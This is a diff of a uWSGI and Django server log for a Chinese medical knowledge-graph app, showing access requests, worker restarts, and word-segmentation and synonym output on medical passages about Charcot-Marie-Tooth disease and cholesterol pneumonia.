+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 6837|app: 0|req: 1/31] 142.93.9.47 () {38 vars in 481 bytes} [Mon Apr 22 01:43:16 2019] GET /phpMyAdmin/scripts/setup.php => generated 1121 bytes in 4127 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 31/32] 142.93.9.47 () {38 vars in 481 bytes} [Mon Apr 22 01:43:20 2019] GET /phpmyadmin/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6837|app: 0|req: 2/33] 142.93.9.47 () {38 vars in 467 bytes} [Mon Apr 22 01:43:21 2019] GET /pma/scripts/setup.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 32/34] 142.93.9.47 () {38 vars in 471 bytes} [Mon Apr 22 01:43:21 2019] GET /phpmy/scripts/setup.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 33/35] 59.36.119.226 () {38 vars in 659 bytes} [Mon Apr 22 04:58:28 2019] GET /phpmy/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 34/36] 124.160.57.70 () {44 vars in 836 bytes} [Mon Apr 22 05:06:30 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 35/37] 124.160.57.70 () {44 vars in 876 bytes} [Mon Apr 22 05:06:31 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+259====1
+{'title': '改变“重口味”饮食习惯 远离疾病', 'abstract': '当今的饮食一般都是“重口味”的食物，如汉堡、烧烤、火锅等。这些日常的“重口味”饮食的危害你不得不知道。那如何改变“重口味”的饮食习惯呢？', 'url': 'https://ys.99.com.cn/zhinan/572453.htm'}
+[pid: 6837|app: 0|req: 3/38] 124.160.57.70 () {44 vars in 878 bytes} [Mon Apr 22 05:06:31 2019] GET /views/console/ => generated 13483 bytes in 1191 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 36/39] 124.160.57.70 () {44 vars in 878 bytes} [Mon Apr 22 05:06:52 2019] GET /views/consoles => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 6838|app: 0|req: 1/40] 124.160.57.70 () {44 vars in 880 bytes} [Mon Apr 22 05:06:52 2019] GET /views/consoles/ => generated 8292 bytes in 3731 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 6839|app: 0|req: 37/41] 124.160.57.70 () {44 vars in 884 bytes} [Mon Apr 22 05:07:16 2019] GET /views/distinguish => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 1)
+[pid: 6839|app: 0|req: 38/42] 124.160.57.70 () {44 vars in 886 bytes} [Mon Apr 22 05:07:16 2019] GET /views/distinguish/ => generated 4075 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
 /usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:39: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
   m.add_string(self.Q_C.public_numbers().encode_point())
 /usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:96: CryptographyDeprecationWarning: Support for unsafe construction of public numbers from encoded data will be removed in a future version. Please use EllipticCurvePublicKey.from_encoded_point
@@ -104,307 +48,140 @@
 ------start------
 [connect success] | ip : 39.108.111.94
 result:
-Model loaded succeed [['我们', 'r'], ['常常', 'd'], ['会', 'v'], ['听到', 'v'], ['人', 'n'], ['说', 'v'], ['红润', 'a'], ['有', 'v'], ['光泽', 'n'], ['、', 'w'], ['白里透红', 'np'], ['等等', 'u'], ['描述', 'v'], ['脸色', 'n'], ['的', 'u'], ['说法', 'n'], ['，', 'w'], ['这些', 'r'], ['表示', 'v'], ['人体', 'n'], ['造血', 'v'], ['正常', 'a'], ['，', 'w'], ['也', 'd'], ['没有', 'd'], ['缺血', 'v'], ['的', 'u'], ['情况', 'n'], ['，', 'w'], ['而', 'c'], ['脸色', 'n'], ['蜡黄', 'a'], ['、', 'w'], ['暗', 'a'], ['沉', 'g'], ['等等', 'u'], ['则', 'd'], ['表示', 'v'], ['人体', 'n'], ['有', 'v'], ['贫血', 'v'], ['症状', 'n'], ['。', 'w']]
+Model loaded succeed [['腓骨肌萎缩症', 'uw'], ['(', 'w'], ['peronialmyoatrophy', 'x'], [')', 'w'], ['又', 'd'], ['称', 'v'], ['Charcot', 'x'], ['-', 'w'], ['Marie', 'x'], ['-', 'w'], ['Tooth', 'x'], ['病', 'n'], ['(', 'w'], ['CMT', 'x'], [')', 'w'], ['、', 'w'], ['遗传性', 'n'], ['运动感', 'n'], ['觉', 'v'], ['神经病', 'n'], ['(', 'w'], ['hereditarymotorandsensoryneuropathy', 'x'], ['，', 'w'], ['HMSN', 'x'], [')', 'w'], ['，', 'w'], ['是', 'v'], ['一', 'm'], ['组', 'q'], ['最', 'd'], ['常见', 'a'], ['的', 'u'], ['家族', 'n'], ['遗传性', 'n'], ['周围', 'f'], ['神经病', 'n'], ['，', 'w'], ['约', 'd'], ['占', 'v'], ['全部', 'm'], ['遗传性', 'n'], ['神经病', 'n'], ['的', 'u'], ['9', 'm'], ['0', 'q'], ['%', 'w'], ['，', 'w'], ['患病率', 'n'], ['为', 'v'], ['1', 'm'], ['/', 'w'], ['2500', 'm'], ['，', 'w'], ['无', 'v'], ['种族', 'n'], ['差异', 'n'], ['。', 'w'], ['本组', 'r'], ['疾病', 'n'], ['的', 'u'], ['共同', 'a'], ['特点', 'n'], ['为', 'v'], ['儿童', 'n'], ['或', 'c'], ['青少年', 'n'], ['发病', 'v'], ['，', 'w'], ['慢性', 'a'], ['进行性', 'a'], ['腓骨肌', 'n'], ['萎缩', 'v'], ['、', 'w'], ['无力', 'v'], ['，', 'w'], ['感觉障碍', 'uw'], ['，', 'w'], ['腱', 'v'], ['反射', 'v'], ['减低', 'v'], ['或', 'c'], ['消失', 'v'], ['，', 'w'], ['症状', 'n'], ['和', 'c'], ['体征', 'n'], ['比较', 'd'], ['对称', 'a'], ['，', 'w'], ['多数', 'm'], ['患者', 'n'], ['有', 'v'], ['家', 'n'], ['族', 'g'], ['史', 'g'], ['，', 'w'], ['由于', 'p'], ['以', 'p'], ['腓骨肌', 'n'], ['萎缩', 'v'], ['为', 'v'], ['主要', 'a'], ['临床', 'v'], ['特征', 'n'], ['，', 'w'], ['故', 'c'], ['又', 'd'], ['称', 'v'], ['腓骨肌萎缩症', 'uw'], ['(', 'w'], ['peronealmyoatrophy', 'x'], [')', 'w'], ['。', 'w'], ['根据', 'p'], ['神经', 'n'], ['电', 'n'], ['生理', 'n'], ['，', 'w'], ['神经', 'n'], ['病理', 'n'], ['所', 'u'], ['见', 'v'], ['，', 'w'], ['将', 'p'], ['CMT', 'x'], ['分为', 'v'], ['Ⅰ型', 'n'], ['及', 'c'], ['Ⅱ型', 'n'], ['，', 'w'], ['CMT', 'x'], ['Ⅰ型', 'n'], ['称脱', 'v'], ['髓鞘型', 'a'], ['，', 'w'], ['CMT', 'x'], ['Ⅱ型', 'n'], ['称', 'v'], ['轴索型', 'n'], ['(', 'w'], ['neuronaltype', 'x'], [')', 'w'], ['。', 'w']]
 
 ------end------
-[pid: 19832|app: 0|req: 1178/1812] 124.160.57.70 () {52 vars in 1098 bytes} [Sat Apr 20 06:14:31 2019] POST /views/distinguish/getDistinguishData/ => generated 1021 bytes in 10861 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 1)
 ------start------
 [connect success] | ip : 39.108.111.94
 result:
-Model loaded succeed [['胆固醇肺炎', 'uw'], ['是', 'v'], ['胆固醇', 'n'], ['长期', 'd'], ['沉积', 'v'], ['在', 'p'], ['肺', 'n'], ['内', 'f'], ['引起', 'v'], ['的', 'u'], ['一', 'm'], ['种', 'q'], ['慢性', 'a'], ['炎症', 'n'], ['，', 'w'], ['大致', 'd'], ['可', 'v'], ['分为', 'v'], ['原发', 'v'], ['及', 'c'], ['继发', 'v'], ['两', 'm'], ['种', 'q'], ['。', 'w'], ['继发者', 'n'], ['可', 'v'], ['因', 'p'], ['肺部', 'n'], ['慢性', 'a'], ['炎症', 'n'], ['、', 'w'], ['肺结核', 'n'], ['，', 'w'], ['脓肿', 'n'], ['、', 'w'], ['肿瘤', 'n'], ['、', 'w'], ['寄生虫', 'n'], ['，', 'w'], ['纤维化', 'v'], ['、', 'w'], ['胸部', 'n'], ['放疗', 'v'], ['后', 'f'], ['、', 'w'], ['粉尘', 'n'], ['刺激', 'v'], ['和', 'c'], ['重度', 'a'], ['吸烟', 'v'], ['等', 'u'], ['引起', 'v'], ['，', 'w'], ['该病', 'r'], ['为', 'p'], ['少见', 'a'], ['病例', 'n'], ['，', 'w'], ['到', 'p'], ['1997年', 't'], ['，', 'w'], ['国内', 's'], ['文献', 'n'], ['才', 'c'], ['27', 'm'], ['例', 'n'], ['。', 'w']]
+smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'家': [], '组': ['组', '两组', '小组', '分组', '四组', '第一组', '三组', '一组', '组成员', '第三组'], '将': [], '0': [], '无': [], '以': [], '称': ['称', '称之为', '引述', '援引', '所称', '指', '称作', '并称', '指为', '说是'], '髓鞘型': [], '9': [], '族': ['族', '部落', '部族', '族人', '氏族', '族系', '的族', '一族', '人和', '克族'], '反射': ['反射', '光线', '折射', '反射光', '照射', '散射', '入射', '太阳光', '透射', '叠加'], '、': [], '腱': ['腱', '胫骨', '脚踝', '肌腱', '小腿', '膝盖', '腿部', '肋骨', '脚部', '膝部'], 'Charcot': [], '减低': ['减低', '降低', '减少', '减轻', '增加', '大大降低', '减缓', '尽量减少', '大幅提高', '大大减少'], '发病': ['发病', '发作', '患病', '复发', '胃癌', '确诊', '病症', '肺癌', '中风', '得病'], '所': [], '主要': [], '运动感': [], '史': ['史', '巨著', '通史', '历史学者', '日本史', '简史', '文化史', '世界史', '近代史', '两书'], '轴索型': [], '为': [], '感觉障碍': [], '常见': ['常见', '少见', '常用', '罕见', '常见于', '相似', '类似', '典型', '类似于', '少用'], '腓骨肌萎缩症': [], '遗传性': ['遗传性', '遗传病', '遗传疾病', '肾病', '病症', '病变', '性疾病', '内分泌', '帕金森氏症', '增生'], 'neuronaltype': [], '青少年': ['青少年', '儿童', '青年人', '成年人', '孩童', '成人', '年轻人', '少年儿童', '中学生', '年青人'], '比较': ['比较', '较为', '非常', '相当', '更为', '相对', '来得', '相比较', '比起', '尤其'], '神经': ['神经', '神经系统', '大脑', '脊髓', '神经元', '脑', '脑部', '神经细胞', '中枢神经系统', '骨骼肌'], '电': ['电', '浆', '磁', '电气', '电机', '铁', '磁力', '急电', '高压电', '和光'], 'Ⅰ型': [], '特点': ['特点', '特征', '特色', '优点', '不同之处', '特性', '在结构上', '结构上', '表现形式', '基本特征'], '患者': ['患者', '病人', '病患', '症状', '病症', '患儿', '病患者', '病征', '病变', '高血压'], '患病率': ['患病率', '发病率', '发生率', '死亡率', '感染率', '存活率', '出生率', '肥胖率', '比率', '丙型肝炎'], '神经病': ['神经病', '发疯', '白痴', '精神分裂', '偏执', '老是', '自嘲', '打趣', '所谓', '了无'], '差异': ['差异', '差别', '差异性', '区别', '相异', '不同', '关联性', '歧异', '关联', '相似之处'], 'Ⅱ型': [], '本组': [], '无力': ['无力', '不得不', '不了', '不得已', '急于', '无暇', '勉强', '只得', '根本无法', '无能为力'], 'peronealmyoatrophy': [], '是': [], '见': ['见', '闻', '不见', '不知', '听闻', '方知', '只见', '却说', '可知', '唯'], '2500': [], 'Tooth': [], '消失': ['消失', '消亡', '消退', '变成', '遗忘', '绝迹', '消逝', '变为', '销声匿迹', '不复存在'], '慢性': [], '体征': ['体征', '病症', '病因', '征状', '征象', '病状', '临床表现', '恶性肿瘤', '哮喘', '先兆'], '又': [], '多数': ['多数', '大多', '大部分', '大部份', '基本上', '相当多', '极少', '以外', '一般来说', '同样'], '称脱': [], '由于': [], '(': [], '共同': ['共同', '联合', '合作', '协力', '协同', '携手', '共同完成', '主导', '一同', '都由'], '占': ['占', '占到', '占有', '分之一', '%', '占总', '分之二', '占多数', '占去', '九成'], 'Marie': ['Marie', 'Maria', 'Jean', 'Catherine', 'Anne', 'Anna', 'Louise', 'Vincent', 'Helena', 'Ren'], '分为': ['分为', '分成', '分作', '细分', '分别为', '划分', '包含', '统称', '总称', '可分'], '家族': ['家族', '大家族', '后裔', '后代', '家系', '远亲', '堂兄弟', '的王室', '表亲', '三兄弟'], '%': ['%', '%-', '分之一', '比率', '分之二', '半数', '百分比', '九成', '%~', '据估计'], '故': [], 'peronialmyoatrophy': [], '生理': ['生理', '内分泌', '病理', '心理', '荷尔蒙', '生物体', '认知', '环境因素', '生理反应', '表征'], '症状': ['症状', '病症', '病征', '征状', '患者', '副作用', '疼痛', '腹泻', '呕吐', '病因'], '儿童': ['儿童', '孩童', '青少年', '成年人', '幼儿', '成人', '老年人', '学龄前', '婴幼儿', '学童'], '一': [], '对称': ['对称', '平面', '轴对称', '等距', '梯形', '椭圆', '对角', '菱形', '圆锥', '非对称'], '萎缩': ['萎缩', '衰退', '流失', '锐减', '走下坡', '变小', '消退', '停滞', '快速增长', '剧减'], 'CMT': [], '1': [], '根据': [], '的': [], ')': [], '全部': [], '有': [], '/': [], '临床': ['临床', '临床研究', '医学', '诊断', '病理', '流行病学', '药理学', '针灸', '诊疗', '外科'], '及': [], '进行性': ['进行性', '性虐待', '性功能', '癫痫', '神经性', '外阴', '受虐', '变性', '受累', '短暂性'], '种族': ['种族', '人种', '族裔', '白人', '群体', '族群', '种族主义', '宗教信仰', '有色人种', '白种人'], 'hereditarymotorandsensoryneuropathy': [], '周围': ['周围', '周边', '四周', '外围', '附近', '区域内', '周遭', '远处', '外面', '一处'], '，': [], '觉': ['觉', '慧', '寂', '识', '戒', '蕴', '思', '菩提', '善', '智'], '和': [], '-': ['-', '干', '安', '--', '先于', '在在', '时是', '<tr>', 'Pardosa', '</s>'], 'HMSN': [], '病理': ['病理', '病理学', '临床', '生理', '解剖', '组织学', '病变', '病症', '病因', '流行病学'], '腓骨肌': [], '疾病': ['疾病', '病症', '传染病', '性疾病', '病因', '癌症', '营养不良', '哮喘', '疟疾', '结核病'], '约': ['约', '大约', '左右', '近', '达', '分之一', '有约', '平均', '将近', '共约'], '病': ['病', '患', '疾', '伤寒', '患病', '眼疾', '染病', '得病', '病症', '小儿'], '。': [], '特征': ['特征', '特点', '形态', '特性', '构造', '外观上', '特质', '相似性', '基本特征', '不同之处'], '或': [], '最': [], '===': []}
 
 ------end------
-[pid: 19832|app: 0|req: 1179/1813] 124.160.57.70 () {52 vars in 1098 bytes} [Sat Apr 20 06:15:10 2019] POST /views/distinguish/getDistinguishData/ => generated 3108 bytes in 12564 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1180/1814] 138.219.203.25 () {32 vars in 460 bytes} [Sat Apr 20 06:29:36 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1181/1815] 107.170.197.47 () {34 vars in 383 bytes} [Sat Apr 20 06:30:06 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19832|app: 0|req: 1182/1816] 124.160.57.70 () {42 vars in 812 bytes} [Sat Apr 20 07:23:41 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-366====8
-{'title': '10种食物有效预防肺癌', 'abstract': '肺癌是人类很棘手的一种疾病，因其发病率和死亡率增长快了，因此加强预防工作的开展非常重要。下面就是整理的10种有效预防肺癌的食物。', 'url': 'https://ys.99.com.cn/diaoyang/687773.htm'}
-[pid: 19833|app: 0|req: 248/1817] 124.160.57.70 () {44 vars in 878 bytes} [Sat Apr 20 07:23:42 2019] GET /views/console/ => generated 13435 bytes in 721 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 19833|app: 0|req: 249/1818] 124.160.57.70 () {44 vars in 890 bytes} [Sat Apr 20 07:23:44 2019] GET /views/interlocution/ => generated 4095 bytes in 17 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 19832|app: 0|req: 1183/1819] 103.254.58.162 () {32 vars in 460 bytes} [Sat Apr 20 07:29:34 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
+腓骨肌萎缩症---腓骨肌萎缩症
+peronialmyoatrophy---peronialmyoatrophy
+又---又
+称---称
+Charcot---Charcot
+Marie---Marie
+Tooth---Tooth
+病---病
+CMT---CMT
+遗传性---遗传性
+运动感---运动感
+觉---觉
+神经病---神经病
+hereditarymotorandsensoryneuropathy---hereditarymotorandsensoryneuropathy
+HMSN---HMSN
+是---是
+一---一
+组---组
+最---最
+常见---常见
+的---的
+家族---家族
+遗传性---遗传性
+周围---周围
+神经病---神经病
+约---约
+占---占
+全部---全部
+遗传性---遗传性
+神经病---神经病
+的---的
+9---9
+0---0
+患病率---患病率
+为---为
+1---1
+2500---2500
+无---无
+种族---种族
+差异---差异
+。---。
+本组---本组
+疾病---疾病
+的---的
+共同---共同
+特点---特点
+为---为
+儿童---儿童
+或---或
+青少年---青少年
+发病---发病
+慢性---慢性
+进行性---进行性
+腓骨肌---腓骨肌
+萎缩---萎缩
+无力---无力
+感觉障碍---感觉障碍
+腱---腱
+反射---反射
+减低---减低
+或---或
+消失---消失
+症状---症状
+和---和
+体征---体征
+比较---比较
+对称---对称
+多数---多数
+患者---患者
+有---有
+家---家
+族---族
+史---史
+由于---由于
+以---以
+腓骨肌---腓骨肌
+萎缩---萎缩
+为---为
+主要---主要
+临床---临床
+特征---特征
+故---故
+又---又
+称---称
+腓骨肌萎缩症---腓骨肌萎缩症
+peronealmyoatrophy---peronealmyoatrophy
+。---。
+根据---根据
+神经---神经
+电---电
+生理---生理
+神经---神经
+病理---病理
+所---所
+见---见
+将---将
+CMT---CMT
+分为---分为
+Ⅰ型---Ⅰ型
+及---及
+Ⅱ型---Ⅱ型
+CMT---CMT
+Ⅰ型---Ⅰ型
+称脱---称脱
+髓鞘型---髓鞘型
+CMT---CMT
+Ⅱ型---Ⅱ型
+称---称
+轴索型---轴索型
+neuronaltype---neuronaltype
+。---。
+[pid: 6838|app: 0|req: 2/43] 124.160.57.70 () {52 vars in 1100 bytes} [Mon Apr 22 05:07:19 2019] POST /views/distinguish/getDistinguishData/ => generated 4313 bytes in 25862 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 1)
+[pid: 6837|app: 0|req: 4/44] 124.160.57.70 () {44 vars in 888 bytes} [Mon Apr 22 05:08:05 2019] GET /views/interlocution => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 1)
+[pid: 6838|app: 0|req: 3/45] 124.160.57.70 () {44 vars in 890 bytes} [Mon Apr 22 05:08:05 2019] GET /views/interlocution/ => generated 4095 bytes in 19 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 6838|app: 0|req: 4/46] 101.251.242.238 () {38 vars in 586 bytes} [Mon Apr 22 05:31:15 2019] GET / => generated 12678 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 6837|app: 0|req: 5/47] 124.160.57.70 () {44 vars in 878 bytes} [Mon Apr 22 05:31:37 2019] GET /accounts/login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 1)
+[pid: 6838|app: 0|req: 5/48] 124.160.57.70 () {44 vars in 880 bytes} [Mon Apr 22 05:31:37 2019] GET /accounts/login/ => generated 5358 bytes in 243 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+[pid: 6838|app: 0|req: 6/49] 124.160.57.70 () {42 vars in 773 bytes} [Mon Apr 22 05:31:43 2019] GET /favicon.ico => generated 1121 bytes in 71 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
+Mon Apr 22 05:31:44 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
 ...gracefully killing workers...
-Gracefully killing worker 1 (pid: 19831)...
-Gracefully killing worker 2 (pid: 19832)...
-Gracefully killing worker 3 (pid: 19833)...
-Gracefully killing worker 4 (pid: 19834)...
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 07:40:11 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x14651c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 7 seconds on interpreter 0x14651c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 28849, cores: 2)
-spawned uWSGI worker 2 (pid: 28850, cores: 2)
-spawned uWSGI worker 3 (pid: 28851, cores: 2)
-spawned uWSGI worker 4 (pid: 28852, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 28851|app: 0|req: 1/1] 190.64.204.122 () {32 vars in 386 bytes} [Sat Apr 20 07:46:24 2019] GET /manager/html => generated 1121 bytes in 3432 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
-[uwsgi-python-reloader] module/file ./toolkit/nlp/NER.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 28849)...
-Gracefully killing worker 2 (pid: 28850)...
-Gracefully killing worker 3 (pid: 28851)...
-Gracefully killing worker 4 (pid: 28852)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 07:53:24 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x1db81c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1db81c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 29968, cores: 2)
-spawned uWSGI worker 2 (pid: 29969, cores: 2)
-spawned uWSGI worker 3 (pid: 29970, cores: 2)
-spawned uWSGI worker 4 (pid: 29971, cores: 2)
-Python auto-reloader enabled
-[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 29968)...
-Gracefully killing worker 2 (pid: 29969)...
-Gracefully killing worker 3 (pid: 29970)...
-Gracefully killing worker 4 (pid: 29971)...
-[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
-[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
-[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 07:54:48 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x1a351c0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1a351c0 pid: 19822 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 30165, cores: 2)
-spawned uWSGI worker 2 (pid: 30166, cores: 2)
-spawned uWSGI worker 3 (pid: 30167, cores: 2)
